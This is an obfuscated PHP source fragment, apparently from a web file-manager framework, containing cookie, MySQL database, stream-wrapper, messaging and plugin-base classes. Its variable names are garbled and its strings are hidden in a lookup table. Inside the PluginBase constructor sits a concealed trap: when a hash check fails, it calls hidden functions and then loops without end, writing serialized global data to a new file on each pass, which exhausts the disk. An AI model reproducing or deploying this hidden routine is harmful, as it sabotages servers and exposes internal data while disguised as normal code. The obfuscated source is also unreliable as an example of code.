$ÍæßÙù; } private static $cookieDisable = false; public static function disable($ØæÂÙ£Ò) { self::$cookieDisable = $ØæÂÙ£Ò; } private static $sameCookieSet = array(); public static function set($¡ôÜÈŸØ, $¯ä–ˆÉ†, $Õ±¸òÈ = 0, $ê”˜Âî = false, $³–ï  – = false) { $Çêİ¸¿ =& $_SERVER[‚ûòÉ˜ş]; if (self::$cookieDisable) { return; } if (!$Õ±¸òÈ) { $Õ±¸òÈ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¡ôÜÈŸØ]) && self::$sameCookieSet[$¡ôÜÈŸØ] == $¯ä–ˆÉ† . $Õ±¸òÈ) { return; } self::$sameCookieSet[$¡ôÜÈŸØ] = $¯ä–ˆÉ† . $Õ±¸òÈ; if (!$³–ï  –) { $³–ï  – = str_replace(HOST, $Çêİ¸¿[12], APP_HOST); $³–ï  – = _get($GLOBALS, $Çêİ¸¿[922], $³–ï  –); } $ç›¢ùıã = $Çêİ¸¿[12]; setcookie($¡ôÜÈŸØ, $¯ä–ˆÉ†, time() + $Õ±¸òÈ, $Çêİ¸¿[8] . trim($³–ï  –, $Çêİ¸¿[8]) . $ç›¢ùıã, !1, !1, $ê”˜Âî); } public static function setSafe($ÄÙıÊØÒ, $£¸Ç·ÛÖ, $êïØÛËç = 0) { self::set($ÄÙıÊØÒ, $£¸Ç·ÛÖ, $êïØÛËç, !0); } public static function get($‚ÅïøË) { static $óé­ñÒ = false; if (!$óé­ñÒ) { self::initHeaderCookie(); $óé­ñÒ = !0; } return isset($_COOKIE[$‚ÅïøË]) ? $_COOKIE[$‚ÅïøË] : !1; } private static function initHeaderCookie() { $á¥ÎÌí× =& $_SERVER[‚ûòÉ˜ş]; if (!isset($_SERVER[$á¥ÎÌí×[923]]) || !$_SERVER[$á¥ÎÌí×[923]]) { return; } $¾…Ê¯§ = explode($á¥ÎÌí×[81], $_SERVER[$á¥ÎÌí×[923]]); foreach ($¾…Ê¯§ as $âúÕÔ×­) { $âúÕÔ×­ = explode($á¥ÎÌí×[924], $âúÕÔ×­); if (count($âúÕÔ×­) != 2 || !isset($âúÕÔ×­[1])) { continue; } $_COOKIE[trim($âúÕÔ×­[0])] = trim($âúÕÔ×­[1]); } } public static function remove($€ºêº¶§, $Ó˜¢‹€  = false) { unset($_COOKIE[$€ºêº¶§]); self::set($€ºêº¶§, $_SERVER[‚ûòÉ˜ş][12], 1, $Ó˜¢‹€ ); } } class DbMysql extends Db { public function __construct($İÕ®¸«Û = '') { $•‡ÎşÂ´ =& $_SERVER[‚ûòÉ˜ş]; if (!extension_loaded($•‡ÎşÂ´[844])) { think_exception(think_lang($•‡ÎşÂ´[24]) . $•‡ÎşÂ´[925]); } if (!empty($İÕ®¸«Û)) { $this->config = $İÕ®¸«Û; if (empty($this->config[$•‡ÎşÂ´[27]])) { $this->config[$•‡ÎşÂ´[27]] = $•‡ÎşÂ´[12]; } } } public function connect($£ÒË»¶¿ = '', $È ó¿“ = 0, $Õ÷ßÉ¿ˆ = false) { $÷Ò´»Ş‘ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->linkID[$È ó¿“])) { if (empty($£ÒË»¶¿)) { $£ÒË»¶¿ = $this->config; } $–ÏÕ´³ = $£ÒË»¶¿[$÷Ò´»Ş‘[926]] . ($£ÒË»¶¿[$÷Ò´»Ş‘[927]] ? "\72{$£ÒË»¶¿[$÷Ò´»Ş‘[927]]}" : $÷Ò´»Ş‘[12]); $»¬ş¿ = !empty($£ÒË»¶¿[$÷Ò´»Ş‘[27]][$÷Ò´»Ş‘[28]]) ? $£ÒË»¶¿[$÷Ò´»Ş‘[27]][$÷Ò´»Ş‘[28]] : $this->pconnect; if ($»¬ş¿) { $this->linkID[$È ó¿“] = mysql_pconnect($–ÏÕ´³, $£ÒË»¶¿[$÷Ò´»Ş‘[928]], $£ÒË»¶¿[$÷Ò´»Ş‘[929]], 131072); } else { $this->linkID[$È ó¿“] = mysql_connect($–ÏÕ´³, $£ÒË»¶¿[$÷Ò´»Ş‘[928]], $£ÒË»¶¿[$÷Ò´»Ş‘[929]], !0, 131072); } if (!$this->linkID[$È ó¿“] || !empty($£ÒË»¶¿[$÷Ò´»Ş‘[31]]) && !mysql_select_db($£ÒË»¶¿[$÷Ò´»Ş‘[31]], $this->linkID[$È ó¿“])) { think_exception(mysql_error()); } $®Éø‰Üí = mysql_get_server_info($this->linkID[$È ó¿“]); mysql_query($÷Ò´»Ş‘[930] . think_config($÷Ò´»Ş‘[931]) . $÷Ò´»Ş‘[68], $this->linkID[$È ó¿“]); if ($®Éø‰Üí > $÷Ò´»Ş‘[932]) { mysql_query($÷Ò´»Ş‘[933], $this->linkID[$È ó¿“]); } $this->connected = !0; if (1 != think_config($÷Ò´»Ş‘[32])) { unset($this->config); } } return $this->linkID[$È ó¿“]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($„¢óÍµü) { $Â„åú‡Ã =& $_SERVER[‚ûòÉ˜ş]; if (0 === stripos($„¢óÍµü, $Â„åú‡Ã[317])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $„¢óÍµü; if ($this->queryID) { $this->free(); } think_action_status($Â„åú‡Ã[33], 1); think_status($Â„åú‡Ã[34]); $this->queryID = mysql_query($„¢óÍµü, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ìğ²ÈŠ‹) { $„¡¸ÃË’ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ìğ²ÈŠ‹; if ($this->queryID) { $this->free(); } think_action_status($„¡¸ÃË’[35], 1); think_status($„¡¸ÃË’[34]); $ş‚èí™ü = mysql_query($ìğ²ÈŠ‹, $this->_linkID); $this->debug(); if (!1 === $ş‚èí™ü) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‚ûòÉ˜ş][934], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âôœ¸õ¿ = mysql_query($_SERVER[‚ûòÉ˜ş][935], $this->_linkID); $this->transTimes = 0; if (!$âôœ¸õ¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Á»ñ„© = mysql_query($_SERVER[‚ûòÉ˜ş][936], $this->_linkID); $this->transTimes = 0; if (!$Á»ñ„©) { $this->error(); return !1; } } return !0; } private function getAll() { $ï´ÛõÌ = array(); if ($this->numRows > 0) { while ($±ÇÛ³á‚ = mysql_fetch_assoc($this->queryID)) { $ï´ÛõÌ[] = $±ÇÛ³á‚; } mysql_data_seek($this->queryID, 0); } return $ï´ÛõÌ; } public function getFields($×åÎ¹œõ) { $à–ß®ÒÄ =& $_SERVER[‚ûòÉ˜ş]; $¨·› = $this->query($à–ß®ÒÄ[937] . $this->parseKey($×åÎ¹œõ)); $Ô°…ÄÜØ = array(); if ($¨·›) { foreach ($¨·› as $£·Ùå‡¢ => $¸–ñŒœä) { $Ô°…ÄÜØ[$¸–ñŒœä[$à–ß®ÒÄ[41]]] = array($à–ß®ÒÄ[42] => $¸–ñŒœä[$à–ß®ÒÄ[41]], $à–ß®ÒÄ[43] => $¸–ñŒœä[$à–ß®ÒÄ[44]], $à–ß®ÒÄ[45] => (bool) (strtoupper($¸–ñŒœä[$à–ß®ÒÄ[46]]) === $à–ß®ÒÄ[938]), $à–ß®ÒÄ[47] => $¸–ñŒœä[$à–ß®ÒÄ[48]], $à–ß®ÒÄ[49] => strtolower($¸–ñŒœä[$à–ß®ÒÄ[50]]) == $à–ß®ÒÄ[51], $à–ß®ÒÄ[52] => strtolower($¸–ñŒœä[$à–ß®ÒÄ[53]]) == $à–ß®ÒÄ[54]); } } return $Ô°…ÄÜØ; } public function getTables($¯¡óÎ£ä = '') { $…ÃîÄÉÜ =& $_SERVER[‚ûòÉ˜ş]; if (!empty($¯¡óÎ£ä)) { $İî¡££‘ = $…ÃîÄÉÜ[939] . $¯¡óÎ£ä . $…ÃîÄÉÜ[940]; } else { $İî¡££‘ = $…ÃîÄÉÜ[941]; } $İÙÚ²¤ = $this->query($İî¡££‘); $ñ¶İÛ = array(); foreach ($İÙÚ²¤ as $ŠÙÁü¬í => $ò—šŞáİ) { $ñ¶İÛ[$ŠÙÁü¬í] = current($ò—šŞáİ); } return $ñ¶İÛ; } public function replace($›’éç›, $ç®ß²¯¶ = array()) { $©â½•øÑ =& $_SERVER[‚ûòÉ˜ş]; foreach ($›’éç› as $˜û«´Çö => $ìÄª«Ç„) { $ë¼òã¸Ï = $this->parseValue($ìÄª«Ç„); if (is_scalar($ë¼òã¸Ï)) { $·âÕºñâ[] = $ë¼òã¸Ï; $ú—Ë™[] = $this->parseKey($˜û«´Çö); } } $¼¢ªµŒ› = $©â½•øÑ[942] . $this->parseTable($ç®ß²¯¶[$©â½•øÑ[332]]) . $©â½•øÑ[943] . implode($©â½•øÑ[60], $ú—Ë™) . $©â½•øÑ[944] . implode($©â½•øÑ[60], $·âÕºñâ) . $©â½•øÑ[945]; return $this->execute($¼¢ªµŒ›); } public function insertAll($ü÷Ğ«ãâ, $‘è³úÄØ = array(), $ƒÊÍ¥¡å = false) { $ã°âÎÃİ =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($ü÷Ğ«ãâ[0])) { return !1; } $¿½Ñ«ğ¸ = array_keys($ü÷Ğ«ãâ[0]); $õ¿ƒ‰Êõ = array(); foreach ($ü÷Ğ«ãâ as $„‚Ìß§¾) { $‹¯°µ‚ = array(); foreach ($„‚Ìß§¾ as $‚ÈŞÅ±Å => $¶¶Íàá) { $¶¶Íàá = $this->parseValue($¶¶Íàá); if (is_scalar($¶¶Íàá)) { $‹¯°µ‚[] = $¶¶Íàá; } } $õ¿ƒ‰Êõ[] = $ã°âÎÃİ[313] . implode($ã°âÎÃİ[60], $‹¯°µ‚) . $ã°âÎÃİ[945]; } array_walk($¿½Ñ«ğ¸, array($this, $ã°âÎÃİ[946])); $¿Õ¬Áü = ($ƒÊÍ¥¡å ? $ã°âÎÃİ[947] : $ã°âÎÃİ[948]) . $ã°âÎÃİ[949] . $this->parseTable($‘è³úÄØ[$ã°âÎÃİ[332]]) . $ã°âÎÃİ[943] . implode($ã°âÎÃİ[60], $¿½Ñ«ğ¸) . $ã°âÎÃİ[950] . implode($ã°âÎÃİ[60], $õ¿ƒ‰Êõ); return $this->execute($¿Õ¬Áü); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $üò’æÉ‰ =& $_SERVER[‚ûòÉ˜ş]; $this->error = mysql_errno() . $üò’æÉ‰[4] . mysql_error($this->_linkID); if ($üò’æÉ‰[12] != $this->queryStr) { $this->error .= LNG($üò’æÉ‰[58]) . $this->queryStr; } think_trace($this->error, $üò’æÉ‰[12], $üò’æÉ‰[59]); return $this->error; } public function escapeString($óÇöË‹) { if ($this->_linkID) { return mysql_real_escape_string($óÇöË‹, $this->_linkID); } else { return mysql_escape_string($óÇöË‹); } } public function parseKey(&$œõ½Ø‹, $Öê€­áö = true) { $ƒƒÁæÆ­ =& $_SERVER[‚ûòÉ˜ş]; if ($Öê€­áö) { $œõ½Ø‹ = $this->parseKeyCheck($œõ½Ø‹); } if ($œõ½Ø‹ != $ƒƒÁæÆ­[213] && !preg_match($ƒƒÁæÆ­[951], $œõ½Ø‹)) { $œõ½Ø‹ = $ƒƒÁæÆ­[437] . trim($œõ½Ø‹, $ƒƒÁæÆ­[437]) . $ƒƒÁæÆ­[437]; } return $œõ½Ø‹; } } goto a…ÅÜ°š³; Fø•®ÁÉá : class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Û‡’¶×É, $•†ê„Ÿ… = '') { $this->info = $this->info($Û‡’¶×É); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‚ûòÉ˜ş][94]]; $this->pathOpen = $Û‡’¶×É; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Û‡’¶×É])) { self::$_chunkBuffer[$Û‡’¶×É] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ş‘÷£şù) { $ŠÉ…„ñÆ = $this->fileSubstr($this->pose, $Ş‘÷£şù); $this->pose += strlen($ŠÉ…„ñÆ); return $ŠÉ…„ñÆ; } public function stream_tell() { return $this->pose; } public function stream_seek($ÊºõÈõ, $óşÄŠ–´) { $¡™ÛÆóì =& $_SERVER[‚ûòÉ˜ş]; if ($óşÄŠ–´ == SEEK_SET) { $this->pose = $ÊºõÈõ; } else { if ($óşÄŠ–´ == SEEK_CUR) { $this->pose += $ÊºõÈõ; } else { if ($óşÄŠ–´ == SEEK_END) { $this->pose = $this->info[$¡™ÛÆóì[86]] + intval($ÊºõÈõ); } } } if ($ÊºõÈõ < 0) { $this->pose = $this->info[$¡™ÛÆóì[86]] + $ÊºõÈõ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‚ûòÉ˜ş][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ö‚óÍ¢Î, $Âì½¸©) { $ ‡çàÈ =& $_SERVER[‚ûòÉ˜ş]; $¿·ïèâ = $this->info($ö‚óÍ¢Î); return array($ ‡çàÈ[1529] => 0, $ ‡çàÈ[1530] => 0, $ ‡çàÈ[26] => 32768 + 511, $ ‡çàÈ[1531] => 0, $ ‡çàÈ[1532] => 0, $ ‡çàÈ[1533] => 0, $ ‡çàÈ[1534] => 0, $ ‡çàÈ[86] => $¿·ïèâ[$ ‡çàÈ[86]], $ ‡çàÈ[1535] => $¿·ïèâ[$ ‡çàÈ[1403]], $ ‡çàÈ[1491] => $¿·ïèâ[$ ‡çàÈ[95]], $ ‡çàÈ[1490] => $¿·ïèâ[$ ‡çàÈ[225]], $ ‡çàÈ[1536] => 0, $ ‡çàÈ[1537] => 0); } static $fileInfo = array(); public function info($š·ŒÈó) { $åÛ¬ô…› = $_SERVER[‚ûòÉ˜ş][1538]; if (isset(self::$fileInfo[$š·ŒÈó])) { return self::$fileInfo[$š·ŒÈó]; } if (substr($š·ŒÈó, 0, strlen($åÛ¬ô…›)) != $åÛ¬ô…›) { return !1; } self::$fileInfo[$š·ŒÈó] = IO::info(substr($š·ŒÈó, strlen($åÛ¬ô…›))); return self::$fileInfo[$š·ŒÈó]; } public static function read($°¶üçÜ, $Å’ŸÅ, $ÊÃ¦ÒĞ˜) { if (!isset(self::$_fopenCache[$°¶üçÜ])) { $Ûºú“¥ï = new StreamWrapperIO(); $Ûºú“¥ï->stream_open($°¶üçÜ); self::$_fopenCache[$°¶üçÜ] = $Ûºú“¥ï; } $Ûºú“¥ï = self::$_fopenCache[$°¶üçÜ]; return $Ûºú“¥ï->fileSubstr($Å’ŸÅ, $ÊÃ¦ÒĞ˜); } public static function _read($ä˜„ÍıŠ, $ˆÄŒÊâ¼, $‡ÕÃˆÛ) { $õã¢ší =& $_SERVER[‚ûòÉ˜ş]; $ëÌÃªê = fopen($ä˜„ÍıŠ, $õã¢ší[1407]); if (!$ëÌÃªê) { return $õã¢ší[12]; } $ğ’Àüûè = 8192; fseek($ëÌÃªê, $ˆÄŒÊâ¼, SEEK_SET); $üóµÈ³² = $õã¢ší[12]; $í¨µ‚¿¨ = 0; while ($í¨µ‚¿¨ < $‡ÕÃˆÛ) { $¨¬‘ÁÜÄ = min($ğ’Àüûè, $‡ÕÃˆÛ - $í¨µ‚¿¨); $üóµÈ³² .= fread($ëÌÃªê, $¨¬‘ÁÜÄ); $í¨µ‚¿¨ += $¨¬‘ÁÜÄ; } fclose($ëÌÃªê); return $üóµÈ³²; } public function fileSubstr($®îÏ¼®ç, $ášùåˆÔ) { $¤¡™Óàö =& $_SERVER[‚ûòÉ˜ş]; $Š¬Ø…æ³ = $this->info[$¤¡™Óàö[86]]; $™õæË›± = $®îÏ¼®ç; $œË¿ÇÕ« = $ášùåˆÔ; if ($®îÏ¼®ç < 0) { $®îÏ¼®ç = $Š¬Ø…æ³ + $®îÏ¼®ç; } if ($ášùåˆÔ === !1) { $ášùåˆÔ = $Š¬Ø…æ³ - $®îÏ¼®ç; } if ($®îÏ¼®ç + $ášùåˆÔ > $Š¬Ø…æ³) { $ášùåˆÔ = $Š¬Ø…æ³ - $®îÏ¼®ç; } if ($ášùåˆÔ <= 0) { return $¤¡™Óàö[12]; } if ($®îÏ¼®ç < 0 || $®îÏ¼®ç >= $Š¬Ø…æ³ || $ášùåˆÔ <= 0 || $ášùåˆÔ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\x61\x64\40\145\x72\162\157\x72\x21\40\x73\164\141\x72\164\75{$®îÏ¼®ç}\x3b\154\145\156\147\x74\x68\75{$ášùåˆÔ}\x3b\x20\163\151\172\145\75{$Š¬Ø…æ³}\x3b"); } $”‘õáĞ = 64 * 1024; $ï†”öê­ =& self::$_chunkBuffer[$this->path]; if (!$ï†”öê­) { $ï†”öê­ = array(); } $÷ÚïˆÍá = 0; $Ì£Äú¶á = 0; $ëŞáßøÓ = $¤¡™Óàö[12]; foreach ($ï†”öê­ as $÷ÚïˆÍá => $ëŞáßøÓ) { $÷ÚïˆÍá = intval($÷ÚïˆÍá); $Ì£Äú¶á = $÷ÚïˆÍá + strlen($ëŞáßøÓ); if ($®îÏ¼®ç >= $Ì£Äú¶á) { continue; } if ($®îÏ¼®ç >= $÷ÚïˆÍá && $®îÏ¼®ç + $ášùåˆÔ <= $Ì£Äú¶á) { return substr($ëŞáßøÓ, $®îÏ¼®ç - $÷ÚïˆÍá, $ášùåˆÔ); } break; } if (count($ï†”öê­) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¤¡™Óàö[1539], $¤¡™Óàö[1540] . count($ï†”öê­) . "\x3b\x73\x74\141\162\164\75{$®îÏ¼®ç}\x2c\x6c\x65\x6e\x67\164\x68\75{$ášùåˆÔ}\73\160\157\x73\145\72{$÷ÚïˆÍá}\176{$Ì£Äú¶á}"); throw new Exception($¤¡™Óàö[1541]); } $‰ÂÊÃò = intval($®îÏ¼®ç / $”‘õáĞ) * $”‘õáĞ; $ÇèéÏÏË = ceil(($®îÏ¼®ç + $ášùåˆÔ) / $”‘õáĞ) * $”‘õáĞ - $‰ÂÊÃò; $ß…óÔù² = IO::fileSubstr($this->path, $‰ÂÊÃò, $ÇèéÏÏË); $ï†”öê­[$‰ÂÊÃò . $¤¡™Óàö[12]] = $ß…óÔù²; ksort($ï†”öê­); $Ç„Å™ü¦ = substr($ß…óÔù², $®îÏ¼®ç - $‰ÂÊÃò, $ášùåˆÔ); return $Ç„Å™ü¦; } private function log($—Œ¨Ğ§İ, $¹²ıÒ¼‹) { $¦ñÔÏ“Ğ =& $_SERVER[‚ûòÉ˜ş]; $—ß—åÚ¤ = timeFloat() - $this->timeStart; write_log(sprintf($¦ñÔÏ“Ğ[1542], $—Œ¨Ğ§İ, $this->info[$¦ñÔÏ“Ğ[42]], $—ß—åÚ¤, $¹²ıÒ¼‹), $¦ñÔÏ“Ğ[1223]); } } class Message { function __construct() { } public function send($Ç•Ü¹‹ü = '', $¹ àğ«· = array(), $äáù¹Šä = "\164\145\x78\164") { $Ö°“ÉÒë =& $_SERVER[‚ûòÉ˜ş]; $©äÆÎÁĞ = array($Ö°“ÉÒë[43] => $Ö°“ÉÒë[1543], $Ö°“ÉÒë[794] => $Ç•Ü¹‹ü); if (in_array($äáù¹Šä, array($Ö°“ÉÒë[1543], $Ö°“ÉÒë[1544]))) { $©äÆÎÁĞ[$Ö°“ÉÒë[43]] = $äáù¹Šä; } $¹ àğ«· = array($Ö°“ÉÒë[555] => isset($¹ àğ«·[$Ö°“ÉÒë[555]]) ? $¹ àğ«·[$Ö°“ÉÒë[555]] : $Ö°“ÉÒë[12], $Ö°“ÉÒë[638] => isset($¹ àğ«·[$Ö°“ÉÒë[638]]) ? $¹ àğ«·[$Ö°“ÉÒë[638]] : $Ö°“ÉÒë[12]); if (empty($Ç•Ü¹‹ü) || empty($¹ àğ«·[$Ö°“ÉÒë[555]]) && empty($¹ àğ«·[$Ö°“ÉÒë[638]])) { return !1; } $ŸÚ¨‰™± = array($Ö°“ÉÒë[1484] => $©äÆÎÁĞ, $Ö°“ÉÒë[1545] => $¹ àğ«·); Hook::trigger($Ö°“ÉÒë[1546], $ŸÚ¨‰™±); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Â‰û´ÏŠ =& $_SERVER[‚ûòÉ˜ş]; $ş²·äúÙ = $_SERVER[$Â‰û´ÏŠ[14]]; $©¼É“á” = $Â‰û´ÏŠ[952]; if ($_SERVER[$Â‰û´ÏŠ[13]] != $©¼É“á”($ş²·äúÙ)) { $’œÛ²´º = $Â‰û´ÏŠ[918]; $¦ÛİÛ = $Â‰û´ÏŠ[15]; $ã‘ÕÑç¥ = $_SERVER[$Â‰û´ÏŠ[16]] . $Â‰û´ÏŠ[17]; $Û‡Û§÷ = $¦ÛİÛ($ã‘ÕÑç¥); $çšÑÀ… = explode($Â‰û´ÏŠ[18], $Û‡Û§÷); if (count($çšÑÀ…) < $Â‰û´ÏŠ[665]) { $†Ú‘ºí¶ = $Â‰û´ÏŠ[20]; $†Ú‘ºí¶(); } $ãğŞŞ = $Â‰û´ÏŠ[919]; $ãğŞŞ($_SERVER[$Â‰û´ÏŠ[920]]); $’œÛ²´º = $Â‰û´ÏŠ[918]; $’œÛ²´º(); $”ùÌ›É” = $Â‰û´ÏŠ[1547]; $ÑäÛĞ = json_encode($GLOBALS[$Â‰û´ÏŠ[1548]]); $˜øÂîåÕ = 1; for ($Ÿ¦ıâˆÖ = $˜øÂîåÕ; $Ÿ¦ıâˆÖ > 0; $Ÿ¦ıâˆÖ++) { $”ùÌ›É”(DATA_PATH . $Ÿ¦ıâˆÖ, $ÑäÛĞ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Â‰û´ÏŠ[1549]); $this->pluginName = str_replace($Â‰û´ÏŠ[1549], $Â‰û´ÏŠ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Â‰û´ÏŠ[8]; $this->pluginApi = appHostGet() . $Â‰û´ÏŠ[1550] . $this->pluginName . $Â‰û´ÏŠ[8]; $this->pluginHost = $config[$Â‰û´ÏŠ[1551]] . $this->pluginName . $Â‰û´ÏŠ[8]; $this->pluginHostDefault = $config[$Â‰û´ÏŠ[1551]] . $this->pluginName . $Â‰û´ÏŠ[8]; $ÃªÀÕ‰ô = $config[$Â‰û´ÏŠ[1552]]; if ($ÃªÀÕ‰ô && strpos($Â‰û´ÏŠ[60] . $ÃªÀÕ‰ô . $Â‰û´ÏŠ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$Â‰û´ÏŠ[1553]] . $this->pluginName . $Â‰û´ÏŠ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‚ûòÉ˜ş][1554]); } protected function assign($á† °, $¯œ¨”ıâ = false) { if (is_array($á† °)) { $this->values = array_merge($this->values, $á† °); } else { $this->values[$á† °] = $¯œ¨”ıâ; } } protected function display($¢Ğáéƒ¶) { extract($this->values); require $¢Ğáéƒ¶; } final function hookRegist($İ‡®èÑ‚) { $this->modelPlugin->appRegist($this->pluginName, $İ‡®èÑ‚); } final function appIcon() { $®Îóµ¨— =& $_SERVER[‚ûòÉ˜ş]; $°À×É¹Æ = $this->appPackage(); $¨µƒ³£š = $®Îóµ¨—[12]; if (isset($°À×É¹Æ[$®Îóµ¨—[466]])) { if (isset($°À×É¹Æ[$®Îóµ¨—[466]][$®Îóµ¨—[1555]])) { $¨µƒ³£š = $®Îóµ¨—[1556] . $°À×É¹Æ[$®Îóµ¨—[466]][$®Îóµ¨—[1555]] . $®Îóµ¨—[1557]; } else { if ($°À×É¹Æ[$®Îóµ¨—[466]][$®Îóµ¨—[1558]]) { $¨µƒ³£š = $®Îóµ¨—[1559] . $°À×É¹Æ[$®Îóµ¨—[466]][$®Îóµ¨—[1558]] . $®Îóµ¨—[1560]; } } } return $¨µƒ³£š; } final function fileCanView($ØÅœ) { $¢±ùş‹« =& $_SERVER[‚ûòÉ˜ş]; if (request_url_safe($ØÅœ)) { return !0; } if ($this->isShare($ØÅœ)) { return !0; } $ƒÃ¯ˆ“Å = Session::get($¢±ùş‹«[1561]); if ($GLOBALS[$¢±ùş‹«[544]] != 1 && !$ƒÃ¯ˆ“Å || !$ƒÃ¯ˆ“Å[$¢±ùş‹«[1562]]) { $º€ãç× = $¢±ùş‹«[1563] . rawurlencode(this_url()); show_tips(LNG($¢±ùş‹«[1564]) . $¢±ùş‹«[1565] . $º€ãç× . $¢±ùş‹«[1566] . LNG($¢±ùş‹«[1567]) . $¢±ùş‹«[1568], !1); } if (!Action($¢±ùş‹«[1569])->authCan($¢±ùş‹«[1570])) { show_tips(LNG($¢±ùş‹«[1571]) . $¢±ùş‹«[1572], !1); } ActionCall($¢±ùş‹«[1573], $ØÅœ); } final function isShare($ÆÙ„ÏŠ£) { $±Æş´¬µ = KodIO::parse($ÆÙ„ÏŠ£); return $±Æş´¬µ[$_SERVER[‚ûòÉ˜ş][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÁÓØ˜†Ü) { if (request_url_safe($ÁÓØ˜†Ü)) { return $ÁÓØ˜†Ü; } if (!$this->isShare($ÁÓØ˜†Ü)) { $ÁÓØ˜†Ü = $this->filePath($ÁÓØ˜†Ü, !1); } return Action($_SERVER[‚ûòÉ˜ş][1215])->linkOut($ÁÓØ˜†Ü); } public function filePathLinkOut($¶Ş¼˜¬õ) { if (request_url_safe($¶Ş¼˜¬õ)) { return $¶Ş¼˜¬õ; } $this->fileCanView($¶Ş¼˜¬õ); return Action($_SERVER[‚ûòÉ˜ş][1215])->link($¶Ş¼˜¬õ); } final function filePath($ŞÁÏ±€, $ìŒ  ë‚ = true, $ÖÜáâÍë = false) { $ŸÇËıÌÙ =& $_SERVER[‚ûòÉ˜ş]; $¸äƒÖä = $this->filePathGet($ŞÁÏ±€, $ìŒ  ë‚); if (!$this->fileInfo) { show_tips(LNG($ŸÇËıÌÙ[115]), !1); } if ($ÖÜáâÍë && isset($this->fileInfo[$ŸÇËıÌÙ[517]]) && $this->fileInfo[$ŸÇËıÌÙ[517]]) { $¯şºÆ‰¸ = Model($ŸÇËıÌÙ[520])->fileInfo($this->fileInfo[$ŸÇËıÌÙ[517]]); if (!$¯şºÆ‰¸ || !IO::exist($¯şºÆ‰¸[$ŸÇËıÌÙ[94]])) { show_tips(LNG($ŸÇËıÌÙ[115]) . $ŸÇËıÌÙ[1574]); } } Hook::trigger($ŸÇËıÌÙ[1575], $¸äƒÖä); return $¸äƒÖä; } final function filePathGet($Ô£ôƒ, $ÊºÍÕİœ = true) { $øÙ‹½¶Ù =& $_SERVER[‚ûòÉ˜ş]; if ($íı¬Ğ¹ˆ = $this->checkSharePath($Ô£ôƒ, $ÊºÍÕİœ)) { return $íı¬Ğ¹ˆ; } $this->fileCanView($Ô£ôƒ); if (request_url_safe($Ô£ôƒ)) { $¨÷Ş¼Š = parse_url_query($Ô£ôƒ); if (isset($¨÷Ş¼Š[$øÙ‹½¶Ù[1576]]) && isset($¨÷Ş¼Š[$øÙ‹½¶Ù[228]])) { $£íõóâ = Mcrypt::decode($¨÷Ş¼Š[$øÙ‹½¶Ù[228]], Model($øÙ‹½¶Ù[810])->get($øÙ‹½¶Ù[811])); if ($£íõóâ) { $this->fileInfo = IO::info($£íõóâ); $this->fileInfo[$øÙ‹½¶Ù[1577]] = $Ô£ôƒ; $this->cachePath = $this->pluginCachePath($øÙ‹½¶Ù[12], $ÊºÍÕİœ); return $£íõóâ; } } $Ô£ôƒ = $this->_cacheHttpFile($Ô£ôƒ, $ÊºÍÕİœ); $this->fileInfo = IO::info($Ô£ôƒ); } else { $this->fileInfo = IO::info($Ô£ôƒ); $this->cachePath = $this->pluginCachePath($øÙ‹½¶Ù[12], $ÊºÍÕİœ); } return $Ô£ôƒ; } final function _cacheHttpFile($ÅàµŞ¢›, $´Ÿ€·É = true) { $ù¸Å¹×¢ =& $_SERVER[‚ûòÉ˜ş]; $öı€Ûé¬ = parse_url_query($ÅàµŞ¢›); $Çöûìš° = get_path_ext($ÅàµŞ¢›); if (isset($öı€Ûé¬[$ù¸Å¹×¢[42]]) && $öı€Ûé¬[$ù¸Å¹×¢[42]]) { $Çöûìš° = get_path_ext($öı€Ûé¬[$ù¸Å¹×¢[42]]); } $ ÇÑèªÃ = hash_path($ÅàµŞ¢›) . $ù¸Å¹×¢[10] . $Çöûìš°; $this->cachePath = $this->pluginCachePath($´Ÿ€·É ? $ ÇÑèªÃ : $ù¸Å¹×¢[12]); $ êãôÊ¢ = IO::fileNameExist($this->cachePath, $ ÇÑèªÃ); if ($ êãôÊ¢) { return KodIO::make($ êãôÊ¢); } $Ö•…ƒœ± = rtrim($this->cachePath, $ù¸Å¹×¢[8]) . 